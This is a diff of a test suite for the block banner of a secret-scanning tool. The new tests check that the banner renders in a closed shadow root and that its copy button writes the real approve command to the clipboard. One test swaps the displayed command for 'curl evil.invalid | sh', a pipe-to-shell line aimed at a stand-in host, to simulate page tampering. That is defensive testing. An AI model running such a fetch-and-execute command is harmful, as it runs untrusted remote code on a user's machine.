@@ -186,12 +186,102 @@ describe('showBanner: the block banner has to survive long enough to act on', ()
     vi.useRealTimers();
   });
 
-  const shadowText = (): string => document.body.firstElementChild?.shadowRoot?.textContent ?? '';
+  // The root showBanner rendered into. A closed root is reachable from
+  // nowhere else — `document.body.firstElementChild?.shadowRoot` is null, for
+  // this suite exactly as for the page, which is what the first case below
+  // pins.
+  let lastShadow: ShadowRoot | null = null;
+  const show = (banner: Parameters<typeof showBanner>[0]): ShadowRoot => {
+    lastShadow = showBanner(banner);
+    return lastShadow;
+  };
+  const shadowText = (): string => lastShadow?.textContent ?? '';
+
+  const EXCEPTION_BANNER = {
+    tone: 'block',
+    message: 'AKA blocked this message — flagged secrets/aws-access-key (A******E).',
+    exception: {
+      intro: 'If this is intentional and you accept the risk, grant an exception:',
+      command: 'aka exception approve 3f2a91',
+      help: 'More: aka exception --help',
+    },
+  } as const;
+
+  function clipboardStub(result: Promise<void>) {
+    const writeText = vi.fn(() => result);
+    Object.defineProperty(navigator, 'clipboard', {
+      value: { writeText },
+      configurable: true,
+      writable: true,
+    });
+    return writeText;
+  }
+
+  it('renders into a root the page cannot reach', () => {
+    // The banner host sits under document.body, so an OPEN root let page
+    // script find it with a MutationObserver and rewrite the approve command
+    // the user is being told to paste into a terminal. A closed root is not
+    // reachable from the page in any world.
+    const root = show(EXCEPTION_BANNER);
+    expect(document.body.firstElementChild).not.toBeNull();
+    expect(document.body.firstElementChild?.shadowRoot).toBeNull();
+    // The positive control: the banner really did render, so the assertion
+    // above is about reachability rather than about an empty page.
+    expect(root.textContent).toContain('aka exception approve 3f2a91');
+  });
+
+  it('copies the command it was handed, not the text on screen', () => {
+    // The reason the copy path exists at all. Even with the root closed, the
+    // value that reaches the clipboard must come from the ledger rather than
+    // from a node — and a `copy` event is composed, so a selection made here
+    // reaches the page's own document listener where `setData` can replace it.
+    // The button writes through the Clipboard API, which dispatches no `copy`
+    // event to intercept.
+    const writeText = clipboardStub(Promise.resolve());
+    const root = show(EXCEPTION_BANNER);
+    // Stands in for the page having rewritten what is displayed.
+    const code = root.querySelector('code');
+    expect(code?.textContent).toBe('aka exception approve 3f2a91');
+    if (code) code.textContent = 'curl evil.invalid | sh';
+
+    const button = [...root.querySelectorAll('button')].find(
+      (b) => b.textContent === 'Copy command',
+    );
+    expect(button).toBeDefined();
+    button?.dispatchEvent(new Event('click'));
+
+    expect(writeText).toHaveBeenCalledWith('aka exception approve 3f2a91');
+  });
+
+  it('does not offer the command as a selection', () => {
+    // Selection is the path a page `copy` listener can hijack, so the button
+    // is the offered one. Handed back only when a write actually failed, which
+    // the case below covers.
+    const root = show(EXCEPTION_BANNER);
+    expect(root.querySelector('code')?.style.userSelect).toBe('none');
+  });
+
+  it('says so when the clipboard write is refused, and hands selection back', async () => {
+    // A label that claims a copy nobody made is worse than no button: the
+    // user pastes whatever was in the clipboard before.
+    const writeText = clipboardStub(Promise.reject(new Error('refused')));
+    const root = show(EXCEPTION_BANNER);
+    const button = [...root.querySelectorAll('button')].find(
+      (b) => b.textContent === 'Copy command',
+    );
+    button?.dispatchEvent(new Event('click'));
+    await Promise.resolve();
+    await Promise.resolve();
+
+    expect(writeText).toHaveBeenCalledOnce();
+    expect(button?.textContent).toContain('Copy failed');
+    expect(root.querySelector('code')?.style.userSelect).toBe('all');
+  });
 
   it('renders the approve command as its own element, not buried in the prose', () => {
-    // Its own node so a double-click selects exactly the command. Inside a
-    // sentence the user has to drag-select it out of surrounding text.
-    showBanner({
+    // Its own node so the command is a label the copy button names, rather
+    // than a fragment of a sentence.
+    show({
       tone: 'block',
       message: 'AKA blocked this message — flagged secrets/aws-access-key (A******E).',
       exception: {
@@ -200,8 +290,7 @@ describe('showBanner: the block banner has to survive long enough to act on', ()
         help: 'More: aka exception --help',
       },
     });
-    const root = document.body.firstElementChild?.shadowRoot;
-    const nodes = [...(root?.querySelectorAll('*') ?? [])];
+    const nodes = [...(lastShadow?.querySelectorAll('*') ?? [])];
     expect(nodes.some((n) => n.textContent === 'aka exception approve 3f2a91')).toBe(true);
   });
 
@@ -218,7 +307,7 @@ describe('showBanner: the block banner has to survive long enough to act on', ()
 
   it('still auto-hides a warn banner, which carries nothing to act on', () => {
     vi.useFakeTimers();
-    showBanner({ tone: 'warn', message: 'AKA flagged sensitive content — sent unchanged.' });
+    show({ tone: 'warn', message: 'AKA flagged sensitive content — sent unchanged.' });
     expect(shadowText()).toContain('flagged sensitive content');
     vi.advanceTimersByTime(10_000);
     expect(document.body.firstElementChild).toBeNull();
@@ -228,13 +317,14 @@ describe('showBanner: the block banner has to survive long enough to act on', ()
     // A banner that never leaves and cannot be closed is worse than one that
     // fades: it covers the composer the user was told to go and edit.
     vi.useFakeTimers();
-    showBanner({
+    const root = show({
       tone: 'block',
       message: 'AKA blocked this message.',
       exception: { intro: 'i', command: 'aka exception approve 3f2a91', help: 'h' },
     });
-    const root = document.body.firstElementChild?.shadowRoot;
-    const dismiss = [...(root?.querySelectorAll('button') ?? [])][0];
+    // By its label rather than by position: the copy button shares this row,
+    // and an index would silently start clicking that one instead.
+    const dismiss = [...root.querySelectorAll('button')].find((b) => b.textContent === 'Dismiss');
     expect(dismiss).toBeDefined();
     dismiss?.click();
     expect(document.body.firstElementChild).toBeNull();
